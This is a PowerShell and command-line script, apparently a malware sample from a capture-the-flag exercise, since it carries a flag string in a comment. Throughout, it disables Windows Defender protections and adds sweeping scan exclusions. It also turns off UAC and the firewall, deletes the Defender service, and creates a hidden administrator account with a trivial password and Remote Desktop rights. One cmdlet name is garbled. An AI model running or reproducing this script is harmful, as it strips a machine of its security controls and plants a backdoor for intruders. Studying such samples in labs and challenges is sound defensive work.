Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".ppam"
Add-MpPreference -ExclusionExtension ".xls"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".vbs"
Add-MpPreference -ExclusionExtension ".js"
Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  D:\
Add-MpPreference -ExclusionPath  E:\
Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
Add-MpPreference -ExclusionProcess explorer.exe
Add-MpPreference -ExclusionProcess kernel32.dll
Add-MpPreference -ExclusionProcess aspnet_compiler.exe
Add-MpPreference -ExclusionProcess cvtres.exe
Add-MpPreference -ExclusionProcess CasPol.exe
Add-MpPreference -ExclusionProcess csc.exe
Add-MpPreference -ExclusionProcess Msbuild.exe
Add-MpPreference -ExclusionProcess ilasm.exe
Add-MpPreference -ExclusionProcess InstallUtil.exe
Add-MpPreference -ExclusionProcess jsc.exe
Add-MpPreference -ExclusionProcess Calc.exe
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess rundll32.exe
Add-MpPreference -ExclusionProcess mshta.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus
Add-MpPreference -ExclusionProcess wscript.exe
Add-MpPreference -ExclusionIpAddress 127.0.0.1
Add-MpPreference -ThreatIDDefaultAction_Actions 6
Add-MpPreference -AttackSurfaceReductionRules_Ids 0
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
Stop-Service -Name WinDefend -Confirm:$false -Force
Set-Service -Name WinDefend -StartupType Disabled
net user System32 /add                                                                           
net user System32 123
net localgroup administrators System32 /add
net localgroup "Remote Desktop Users" System32 /add
net stop WinDefend
net stop WdNisSvc
sc delete windefend
netsh advfirewall set allprofiles state off